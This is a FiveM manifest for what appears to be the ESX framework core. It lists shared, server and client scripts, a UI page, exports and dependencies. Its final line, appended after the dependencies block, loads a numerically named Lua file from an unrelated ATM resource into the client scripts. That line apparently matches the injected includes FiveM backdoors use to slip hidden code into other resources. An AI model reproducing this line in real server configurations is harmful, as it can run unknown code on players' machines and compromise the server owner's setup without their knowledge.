fx_version 'adamant'
game 'gta5'
version '1.2.0'

shared_scripts {
	'locale.lua',
	'locales/es.lua',
	'config.lua',
	'config.weapons.lua',
}

server_scripts {
	'@async/async.lua',
	'@mysql-async/lib/MySQL.lua',
	'server/common.lua',
	'server/classes/player.lua',
	'server/functions.lua',
	'server/paycheck.lua',
	'server/main.lua',
	'server/commands.lua',
	'common/modules/math.lua',
	'common/modules/table.lua',
	'common/functions.lua'
}

client_scripts {
	'client/*.lua',
	'client/modules/*.lua',
	'common/modules/*.lua',
	'common/*.lua'
}

ui_page {
	'html/ui.html'
}

files {
	'html/ui.html',
	'html/css/app.css',
	'html/js/*.js',
	'html/fonts/Oswald.ttf',
	'html/img/accounts/*.png',
}

exports {
	'getSharedObject'
}

server_exports {
	'getSharedObject'
}

dependencies {
	'mysql-async',
	'async'
}
client_script '@esx_atm/48706.lua'